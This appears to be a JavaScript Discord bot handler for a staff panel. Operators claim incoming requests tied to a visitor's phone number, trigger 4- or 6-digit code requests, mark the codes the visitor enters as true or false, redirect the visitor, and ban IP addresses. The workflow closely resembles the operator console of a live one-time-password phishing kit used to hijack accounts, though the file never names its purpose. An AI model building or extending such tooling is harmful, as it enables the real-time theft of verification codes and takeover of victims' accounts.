import { ButtonBuilder, ButtonStyle, ActionRowBuilder, EmbedBuilder } from "discord.js";
import { CONFIG } from "../config.js";
import { sql, getRequestByPhone, logAction } from "../database.js";
import { getOperatorColor } from "../utils/colors.js";
import { formatPhone } from "../utils/formatters.js";
import { buildRetryEmbed } from "../utils/embedBuilder.js";

export const claimedBy = new Map();

function createBanIPButton(ip) {
    if (!ip || ip === "unknown" || ip === "null" || !ip.includes(".")) return null;
    return new ButtonBuilder()
        .setCustomId("banip_" + ip)
        .setLabel("🚫 Ban IP")
        .setStyle(ButtonStyle.Danger);
}

async function callStaffAPI(action, phone, staffTag) {
    const res = await fetch(CONFIG.API_BASE + "/api/staff-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action, phone, secret: CONFIG.STAFF_SECRET, staff_tag: staffTag })
    });
    return res.json();
}

export async function handleButton(interaction) {
    const parts = interaction.customId.split("_");
    const action = parts[0];
    const payload = parts.slice(1).join("_");

    // ─── CLAIM ───
    if (action === "claim") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAPI("claim", phone, interaction.user.tag);
            if (data.success) {
                claimedBy.set(phone, interaction.user.id);
                await interaction.editReply({ content: "✅ Request **" + formatPhone(phone) + "** claimed by <@" + interaction.user.id + ">" });

                const row = await getRequestByPhone(phone);
                if (row) {
                    const color = getOperatorColor(row.operator);
                    const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                        .setColor(color)
                        .setTitle("📋 Request In Progress")
                        .setDescription("👤 Claimed by <@" + interaction.user.id + ">\n\n**🔧 Choose an action:**");

                    const buttons = [
                        new ButtonBuilder().setCustomId("len4_" + phone).setLabel("🔢 4 digits").setStyle(ButtonStyle.Success),
                        new ButtonBuilder().setCustomId("len6_" + phone).setLabel("🔢 6 digits").setStyle(ButtonStyle.Success),
                        new ButtonBuilder().setCustomId("wrong_" + phone).setLabel("❌ Wrong Number").setStyle(ButtonStyle.Danger),
                        new ButtonBuilder().setCustomId("unclaim_" + phone).setLabel("↩️ Unclaim").setStyle(ButtonStyle.Secondary)
                    ];
                    const banBtn = createBanIPButton(row.ip_address);
                    if (banBtn) buttons.push(banBtn);

                    await interaction.message.edit({ embeds: [newEmbed], components: [new ActionRowBuilder().addComponents(...buttons)] });
                }
            } else {
                await interaction.editReply({ content: "❌ " + data.message });
            }
        } catch (e) {
            await interaction.editReply({ content: "❌ Network error" });
        }
    }

    // ─── 4 DIGITS ───
    if (action === "len4") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAPI("set_length", phone, interaction.user.tag);
            await interaction.editReply({ content: data.success ? "✅ 4-digit code requested for " + formatPhone(phone) : "❌ " + data.message });
            if (data.success) {
                const row = await getRequestByPhone(phone);
                const color = getOperatorColor(row?.operator);
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle("⏳ Waiting for Code (4 digits)")
                    .setDescription("👤 Claimed\n🔢 Code requested: **4 digits**");
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: "❌ Error" }); }
    }

    // ─── 6 DIGITS ───
    if (action === "len6") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAPI("set_length", phone, interaction.user.tag);
            await interaction.editReply({ content: data.success ? "✅ 6-digit code requested for " + formatPhone(phone) : "❌ " + data.message });
            if (data.success) {
                const row = await getRequestByPhone(phone);
                const color = getOperatorColor(row?.operator);
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle("⏳ Waiting for Code (6 digits)")
                    .setDescription("👤 Claimed\n🔢 Code requested: **6 digits**");
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: "❌ Error" }); }
    }

    // ─── WRONG NUMBER ───
    if (action === "wrong") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAPI("wrong_number", phone, interaction.user.tag);
            await interaction.editReply({ content: data.success ? "✅ Wrong number reported for " + formatPhone(phone) : "❌ " + data.message });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle("❌ Wrong Number")
                    .setDescription("❌ User has been redirected to re-enter their phone number.");
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: "❌ Error" }); }
    }

    // ─── UNCLAIM ───
    if (action === "unclaim") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAPI("unclaim", phone, interaction.user.tag);
            if (data.success) {
                claimedBy.delete(phone);
                await interaction.editReply({ content: "↩️ Request **" + formatPhone(phone) + "** unclaimed. Returned to pending." });

                const row = await getRequestByPhone(phone);
                if (row) {
                    const unclaimedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                        .setColor(0x6b7280)
                        .setTitle("📭 Request Unclaimed")
                        .setDescription("↩️ Unclaimed by <@" + interaction.user.id + ">\nThis request is back in the pending queue.");
                    await interaction.message.edit({ embeds: [unclaimedEmbed], components: [] });
                }
            } else {
                await interaction.editReply({ content: "❌ " + data.message });
            }
        } catch (e) { 
            console.error("Unclaim error:", e);
            await interaction.editReply({ content: "❌ Error" }); 
        }
    }

    // ─── TRUE CODE ───
    if (action === "truecode") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAPI("true_code", phone, interaction.user.tag);
            await interaction.editReply({ content: data.success ? "✅ Code validated for " + formatPhone(phone) : "❌ " + data.message });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0x10b981)
                    .setTitle("✅ Code Validated")
                    .setDescription("👤 Validated by <@" + interaction.user.id + ">\nThe user is being redirected to the congratulations page.");
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: "❌ Error" }); }
    }

    // ─── FALSE CODE ───
    if (action === "falsecode") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAPI("false_code", phone, interaction.user.tag);
            await interaction.editReply({ content: data.success ? "❌ Code refused for " + formatPhone(phone) + ". User must re-enter." : "❌ " + data.message });

            if (data.success) {
                const refusedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle("❌ Code Refused")
                    .setDescription("❌ Refused by <@" + interaction.user.id + ">\nThe user has been redirected to enter a new code.");
                await interaction.message.edit({ embeds: [refusedEmbed], components: [] });

                const row = await getRequestByPhone(phone);
                if (row) {
                    await sendRetryEmbed(interaction.client.channels.cache.get(CONFIG.LOG_CHANNEL_ID), row, claimedBy);
                }
            }
        } catch (e) { 
            console.error("False code error:", e);
            await interaction.editReply({ content: "❌ Error" }); 
        }
    }

    // ─── BAN IP ───
    if (action === "banip") {
        await interaction.deferReply({ flags: 64 });
        const ip = payload;
        if (!ip || ip === "unknown" || ip === "null") {
            await interaction.editReply({ content: "❌ Cannot ban: invalid IP address" });
            return;
        }
        try {
            const res = await fetch(CONFIG.API_BASE + "/api/ban-ip", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ ip, secret: CONFIG.STAFF_SECRET, banned_by: interaction.user.tag })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? "🚫 IP **" + ip + "** banned successfully!" : "❌ " + data.message });
            if (data.success) {
                const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle("🔨 IP Banned")
                    .setDescription("🚫 IP **" + ip + "** banned by <@" + interaction.user.id + ">");
                await interaction.message.edit({ embeds: [bannedEmbed], components: [] });
            }
        } catch (e) {
            console.error("Ban IP error:", e);
            await interaction.editReply({ content: "❌ Network error while banning IP" });
        }
    }
}
